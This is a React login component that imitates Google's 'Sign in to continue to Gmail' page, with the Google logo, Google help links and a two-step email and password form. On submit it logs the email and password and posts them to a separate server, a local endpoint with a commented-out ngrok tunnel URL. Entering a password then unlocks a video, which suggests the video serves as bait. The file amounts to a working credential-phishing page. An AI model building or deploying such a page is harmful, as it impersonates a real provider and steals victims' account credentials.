import React, { useState } from "react";
import {
  Box,
  Grid,
  Card,
  Typography,
  Divider,
  TextField,
  Button,
  Menu,
  MenuItem,
  FormGroup,
  FormControlLabel,
  Checkbox,
} from "@mui/material";
import GoogleLogo from "../googlelogo.png";
import GoogleLogo2 from "../googlelogo_color_272x92dp.png";
import KeyboardArrowDownIcon from "@mui/icons-material/KeyboardArrowDown";
import { Link } from "react-router-dom";
import ViewVideo from "./ViewVideo";
import axios from "axios";

function Login(props) {
  const { handleOnclickViewVideoCheck, setVideoPermission, setViewVideo } =
    props;
  const [login, setLogin] = useState(true);
  const [email, setEmail] = useState("");
  const [emailError, setEmailError] = useState(false);
  const [password, setPassword] = useState("");
  const [passwordError, setPasswordError] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const handleOnClickPassword = async (e) => {
    e.preventDefault();
    if (password != "") {
      setViewVideo(false);
      setVideoPermission(true);
    } else {
      setPasswordError(true);
    }
    const data = { email: email, password: password };
    console.log("data", data);
    if (email != "" && password != "") {
      try {
        const res = await axios.post(
          "http://localhost:4000/login",
          // "https://c4ca-2406-7400-c6-75e4-3911-a091-d42a-a3a4.ngrok-free.app/login",
          data
        );
        console.log(res);
      } catch (error) {
        console.log("error", error);
      }
    }
  };

  const handleOnclick = (e) => {
    e.preventDefault();
    email != "" ? setLogin(!login) : setEmailError(true);
  };
  return (
    <Box sx={{ overflow: "hidden" }}>
      <>
        <Grid
          container
          sx={{
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            height: "100vh",
          }}
        >
          <Grid
            item
            xs={12}
            md={4}
            sx={{ mt: { xs: "0px", md: "30px" }, height: "100%" }}
          >
            <Card
              sx={{
                height: "70%",
                boxShadow: "none",
                border: "1px solid #ddd",
                padding: "48px 40px 36px",
              }}
            >
              <Box
                sx={{
                  display: "flex",
                  justifyContent: "center",
                  margin: "auto 0px",
                }}
              >
                <Box sx={{ height: "24px", width: "75px", mr: 1.3 }}>
                  <img
                    src={GoogleLogo2}
                    alt="googlelogo"
                    width={"100%"}
                    height={"100%"}
                  />
                </Box>
              </Box>
              {login ? (
                <>
                  <Box sx={{ mt: "16px" }}>
                    <Box align={"center"}>
                      <Typography component={"h1"} sx={{ fontSize: "24px" }}>
                        Sign in
                      </Typography>
                      <Typography
                        component={"div"}
                        sx={{
                          display: "flex",
                          justifyContent: "center",
                          fontSize: "16px",
                          color: "#202124",
                          pt: "8px",
                        }}
                      >
                        to continue to Gmail
                      </Typography>
                    </Box>
                    <Box
                      component={"form"}
                      sx={{ pt: "24px" }}
                      onSubmit={handleOnclick}
                    >
                      <TextField
                        type="email"
                        name="email"
                        variant="outlined"
                        label="Email or phone"
                        onChange={(e) => {
                          setEmail(e.target.value);
                        }}
                        fullWidth
                        error={emailError}
                        helperText={
                          emailError ? "* Enter an email or phone number" : ""
                        }
                      />
                      <Typography
                        component={"a"}
                        style={{
                          color: "#1A73E8",
                          margin: "11px 0px 3px",
                          textDecoration: "none",
                          fontSize: "14px",
                        }}
                        target="_blank"
                        href="https://accounts.google.com/signin/v2/usernamerecovery"
                      >
                        Forgot email?
                      </Typography>
                      <Box sx={{ fontSize: "14px", mt: 5 }}>
                        <Typography sx={{ fontSize: "14px" }}>
                          Not your computer? Use Guest mode to sign in
                          privately.
                        </Typography>
                        <Typography
                          component={"a"}
                          href="https://support.google.com/chrome/answer/6130773?hl=en"
                          target="_blank"
                          style={{
                            color: "#1A73E8",
                            textDecoration: "none",
                            fontSize: "14px",
                          }}
                        >
                          Learn more
                        </Typography>
                      </Box>
                      <Box
                        sx={{
                          mt: 5,
                          display: "flex",
                          justifyContent: "space-between",
                        }}
                      >
                        <Typography
                          sx={{
                            textTransform: "capitalize",
                            color: "#1A73E8",
                            m: "auto 0",
                          }}
                        >
                          Create account
                        </Typography>
                        <Button
                          variant="contained"
                          type="submit"
                          sx={{
                            textTransform: "capitalize",
                            padding: "5px 25px",
                          }}
                        >
                          Next
                        </Button>
                      </Box>
                    </Box>
                  </Box>
                </>
              ) : (
                <>
                  <Box sx={{ mt: "16px" }}>
                    <Box align={"center"}>
                      <Typography component={"h1"} sx={{ fontSize: "24px" }}>
                        Welcome
                      </Typography>
                      <Box
                        sx={{
                          display: "flex",
                          padding: "10px 20px",
                          margin: "auto 0px",
                          justifyContent: "center",
                        }}
                      >
                        <Button
                          type="button"
                          variant="outlined"
                          sx={{
                            color: "#000",
                            textTransform: "capitalize",
                            fontSize: "12px",
                            display: "flex",
                            backgroundColor: "transparent",
                            borderRadius: "15px",
                            borderColor: "#ddd",
                          }}
                          endIcon={
                            <KeyboardArrowDownIcon sx={{ color: "#000" }} />
                          }
                        >
                          {email}
                        </Button>
                      </Box>
                    </Box>
                    <Box
                      component={"form"}
                      sx={{ pt: "24px" }}
                      onSubmit={handleOnClickPassword}
                    >
                      <TextField
                        type={showPassword ? "text" : "password"}
                        name="password"
                        variant="outlined"
                        label="Enter your Password"
                        fullWidth
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        error={passwordError}
                        helperText={passwordError ? "* Enter a password" : ""}
                      />
                      <Typography
                        component={"div"}
                        style={{ color: "#1A73E8", padding: "9px 0px 3px" }}
                      >
                        <FormGroup>
                          <FormControlLabel
                            control={<Checkbox checked={showPassword} />}
                            label="show password"
                            onClick={() =>
                              setShowPassword(
                                (prevShowPassword) => !prevShowPassword
                              )
                            }
                          />
                        </FormGroup>
                      </Typography>
                      <Box
                        sx={{
                          mt: 5,
                          display: "flex",
                          justifyContent: "space-between",
                        }}
                      >
                        <Typography
                          sx={{
                            textTransform: "capitalize",
                            color: "#1A73E8",
                            m: "auto 0",
                          }}
                        >
                          Forgot password?
                        </Typography>
                        <Button
                          variant="contained"
                          sx={{
                            textTransform: "capitalize",
                            padding: "5px 25px",
                          }}
                          type="submit"
                        >
                          Next
                        </Button>
                      </Box>
                    </Box>
                  </Box>
                </>
              )}
            </Card>
            <Box
              sx={{
                height: "20%",
                mt: "8px",
                display: { xs: "block", md: "flex" },
                justifyContent: { xs: "flex-start", md: "space-between" },
              }}
            >
              <Box>
                <Button
                  id="basic-button"
                  sx={{
                    color: "#000",
                    textTransform: "capitalize",
                    fontSize: "12px",
                    display: "flex",
                    backgroundColor: "transparent",
                  }}
                  endIcon={<KeyboardArrowDownIcon sx={{ color: "#000" }} />}
                >
                  English (United Kingdom)
                </Button>
              </Box>
              <Box sx={{ fontSize: "12px", mt: { xs: "10px", md: 0 } }}>
                <Button
                  sx={{
                    textTransform: "capitalize",
                    backgroundColor: "transparent",
                    color: "#000",
                  }}
                >
                  Help
                </Button>
                <Button
                  sx={{
                    textTransform: "capitalize",
                    backgroundColor: "transparent",
                    color: "#000",
                  }}
                >
                  Privacy
                </Button>
                <Button
                  sx={{
                    textTransform: "capitalize",
                    backgroundColor: "transparent",
                    color: "#000",
                  }}
                >
                  Terms
                </Button>
              </Box>
            </Box>
          </Grid>
        </Grid>
      </>
    </Box>
  );
}

export default Login;
